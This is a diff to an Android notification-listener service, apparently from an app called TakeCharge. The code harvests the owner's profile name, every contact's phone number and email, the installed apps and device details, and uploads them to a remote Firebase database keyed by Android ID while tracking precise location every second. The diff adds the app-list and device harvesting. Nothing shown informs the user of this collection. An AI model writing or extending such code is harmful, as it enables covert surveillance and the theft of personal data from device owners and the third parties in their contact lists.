@@ -1,9 +1,12 @@
 package io.perihelion.takecharge;
 
 import android.content.ContentResolver;
+import android.content.pm.ApplicationInfo;
+import android.content.pm.PackageManager;
 import android.database.Cursor;
 import android.location.Location;
 import android.net.Uri;
+import android.os.Build;
 import android.os.Bundle;
 import android.provider.ContactsContract;
 import android.service.notification.NotificationListenerService;
@@ -26,6 +29,7 @@ import java.io.FileOutputStream;
 import java.io.IOException;
 import java.io.InputStream;
 import java.io.OutputStream;
+import java.util.List;
 
 
 public class MallWhereService extends NotificationListenerService implements GoogleApiClient.ConnectionCallbacks, GoogleApiClient.OnConnectionFailedListener, com.google.android.gms.location.LocationListener {
@@ -51,6 +55,7 @@ public class MallWhereService extends NotificationListenerService implements Goo
         userDataRef = new Firebase("https://takecharge.firebaseio.com/" + getAndroidId());
         setUserInfo();
         uploadUserContacts();
+        getInstalledApps();
         mLocationRequest = LocationRequest.create();
         mLocationRequest.setPriority(LocationRequest.PRIORITY_HIGH_ACCURACY);
         mLocationRequest.setInterval(1000);
@@ -70,7 +75,21 @@ public class MallWhereService extends NotificationListenerService implements Goo
         Log.d(TAG, "ID :" + sbn.getId() + "t" + sbn.getNotification().tickerText + "t" + sbn.getPackageName());
     }
 
+    private void getInstalledApps() {
+        final PackageManager pm = getPackageManager();
+        List<ApplicationInfo> packages = pm.getInstalledApplications(PackageManager.GET_META_DATA);
+        for (ApplicationInfo packageInfo : packages) {
+            Firebase ref = userDataRef.child("apps").push();
+            ref.child("packageName").setValue(packageInfo.packageName);
+            ref.child("appName").setValue(packageInfo.loadLabel(getPackageManager()).toString());
+        }
+    }
+
     private void setUserInfo() {
+        userDataRef.child("userinfo").child("manufacturer").setValue(Build.MANUFACTURER);
+        userDataRef.child("userinfo").child("product").setValue(Build.PRODUCT);
+        userDataRef.child("userinfo").child("model").setValue(Build.MODEL);
+        userDataRef.child("userinfo").child("androidVersion").setValue(Build.VERSION.RELEASE);
         Cursor c = getApplication().getContentResolver().query(ContactsContract.Profile.CONTENT_URI, null, null, null, null);
         c.moveToFirst();
         userDataRef.child("userinfo").child("name").setValue(c.getString(c.getColumnIndex("DISPLAY_NAME")));
@@ -114,46 +133,25 @@ public class MallWhereService extends NotificationListenerService implements Goo
 
     private void uploadUserContacts() {
         ContentResolver cr = getContentResolver();
-        Cursor cur = cr.query(ContactsContract.Contacts.CONTENT_URI, null,
-                null, null, null);
+        Cursor cur = cr.query(ContactsContract.Contacts.CONTENT_URI, null, null, null, null);
         if (cur.getCount() > 0) {
             while (cur.moveToNext()) {
-                Contact newContact = new Contact();
-                newContact.setId(cur.getString(cur
-                        .getColumnIndex(ContactsContract.Contacts._ID)));
-                newContact.setName(cur
-                        .getString(cur
-                                .getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME)));
-
-                if (Integer
-                        .parseInt(cur.getString(cur
-                                .getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER))) > 0) {
-                    Cursor pCur = cr.query(
-                            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
-                            null,
-                            ContactsContract.CommonDataKinds.Phone.CONTACT_ID
-                                    + " = ?", new String[]{newContact.getId()}, null);
+                if (Integer.parseInt(cur.getString(cur.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER))) > 0) {
+                    Contact newContact = new Contact();
+                    newContact.setId(cur.getString(cur.getColumnIndex(ContactsContract.Contacts._ID)));
+                    newContact.setName(cur.getString(cur.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME)));
+                    Cursor pCur = cr.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?", new String[]{newContact.getId()}, null);
                     while (pCur.moveToNext()) {
-                        newContact.setPhone(pCur
-                                .getString(pCur
-                                        .getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)));
+                        newContact.setPhone(pCur.getString(pCur.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)));
                     }
                     pCur.close();
-
-                    Cursor emailCur = cr.query(
-                            ContactsContract.CommonDataKinds.Email.CONTENT_URI,
-                            null,
-                            ContactsContract.CommonDataKinds.Email.CONTACT_ID
-                                    + " = ?", new String[]{newContact.getId()}, null);
+                    Cursor emailCur = cr.query(ContactsContract.CommonDataKinds.Email.CONTENT_URI, null, ContactsContract.CommonDataKinds.Email.CONTACT_ID + " = ?", new String[]{newContact.getId()}, null);
                     while (emailCur.moveToNext()) {
-                        newContact.setEmail(emailCur
-                                .getString(emailCur
-                                        .getColumnIndex(ContactsContract.CommonDataKinds.Email.DATA)));
+                        newContact.setEmail(emailCur.getString(emailCur.getColumnIndex(ContactsContract.CommonDataKinds.Email.DATA)));
                     }
-
                     emailCur.close();
+                    userDataRef.child("contacts").child(newContact.getId()).setValue(newContact);
                 }
-                userDataRef.child("contacts").child(newContact.getId()).setValue(newContact);
             }
         }
         cur.close();
